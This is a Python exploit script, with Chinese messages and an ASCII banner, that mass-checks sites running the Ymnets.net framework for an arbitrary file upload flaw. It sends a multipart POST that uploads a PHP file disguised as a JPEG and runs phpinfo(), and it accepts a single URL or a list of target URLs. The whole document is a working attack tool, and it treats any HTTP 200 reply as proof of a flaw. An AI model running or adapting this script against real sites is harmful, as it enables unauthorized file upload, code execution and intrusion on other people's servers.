import requests
import argparse

# Function to check for vulnerabilities on a single URL
def check_vul(url):
    # Construct the target URL
    target_url = f'{url.strip()}/source/data/tmp/1-2.php'

    # Prepare the payload for the POST request
    payload = '''------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="app"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--'''

    # Set the request headers
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy'  # Added boundary to Content-Type
    }

    try:
        # Send the POST request
        response = requests.post(target_url, data=payload, headers=headers, timeout=6)
        status_code = response.status_code

        # Check if the response indicates a vulnerability
        if status_code == 200:
            print(f'[+]{url} 存在漏洞')
        else:
            print(f'{url} 不存在漏洞')
    except requests.RequestException as e:
        print(f'连接出现问题: ')


# Function to check vulnerabilities in a list of URLs from a file
def check_vuls(filename):
    try:
        with open(filename, 'r') as file:
            for line in file:
                if line.strip():  # Check if line is not empty
                    check_vul(line.strip())
    except FileNotFoundError:
        print(f'文件 {filename} 未找到')
    except Exception as e:
        print(f'读取文件时发生错误: {e}')


# Function to display banner information
def banner():
    info = '''
                                                                                                                       
                                                                                                                       
                                                   tttt         hhhhhhh                                                
                                                ttt:::t         h:::::h                                                
                                                t:::::t         h:::::h                                                
                                                t:::::t         h:::::h                                                
ppppp   pppppppppyyyyyyy           yyyyyyyttttttt:::::ttttttt    h::::h hhhhh          ooooooooooo   nnnn  nnnnnnnn    
p::::ppp:::::::::py:::::y         y:::::y t:::::::::::::::::t    h::::hh:::::hhh     oo:::::::::::oo n:::nn::::::::nn  
p:::::::::::::::::py:::::y       y:::::y  t:::::::::::::::::t    h::::::::::::::hh  o:::::::::::::::on::::::::::::::nn 
pp::::::ppppp::::::py:::::y     y:::::y   tttttt:::::::tttttt    h:::::::hhh::::::h o:::::ooooo:::::onn:::::::::::::::n
 p:::::p     p:::::p y:::::y   y:::::y          t:::::t          h::::::h   h::::::ho::::o     o::::o  n:::::nnnn:::::n
 p:::::p     p:::::p  y:::::y y:::::y           t:::::t          h:::::h     h:::::ho::::o     o::::o  n::::n    n::::n
 p:::::p     p:::::p   y:::::y:::::y            t:::::t          h:::::h     h:::::ho::::o     o::::o  n::::n    n::::n
 p:::::p    p::::::p    y:::::::::y             t:::::t    tttttth:::::h     h:::::ho::::o     o::::o  n::::n    n::::n
 p:::::ppppp:::::::p     y:::::::y              t::::::tttt:::::th:::::h     h:::::ho:::::ooooo:::::o  n::::n    n::::n
 p::::::::::::::::p       y:::::y               tt::::::::::::::th:::::h     h:::::ho:::::::::::::::o  n::::n    n::::n
 p::::::::::::::pp       y:::::y                  tt:::::::::::tth:::::h     h:::::h oo:::::::::::oo   n::::n    n::::n
 p::::::pppppppp        y:::::y                     ttttttttttt  hhhhhhh     hhhhhhh   ooooooooooo     nnnnnn    nnnnnn
 p:::::p               y:::::y                                                                                         
 p:::::p              y:::::y                                                                                          
p:::::::p            y:::::y                                                                                           
p:::::::p           y:::::y                                                                                            
p:::::::p          yyyyyyy                                                                                             
ppppppppp                                                                                                              
                                                                                                                       

'''
    print(info)
    print('-u http://www.xxx.com 进行单个漏洞检测')
    print('-f targetUrl.txt 对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')
    print('3052187779@qq.com')


# Main program execution
def main():
    parser = argparse.ArgumentParser(description="Ymnets.net框架文件上传")
    parser.add_argument('-f', help='请输入网站文件')
    parser.add_argument('-u', help='请输入url')
    args = parser.parse_args()

    if not args.u and not args.f:
        banner()
    else:
        banner()
        try:
            if args.f:
                check_vuls(args.f)
            else:
                check_vul(args.u)
        except Exception as e:
            print(f'运行发生错误: {e}')


if __name__ == '__main__':
    main()
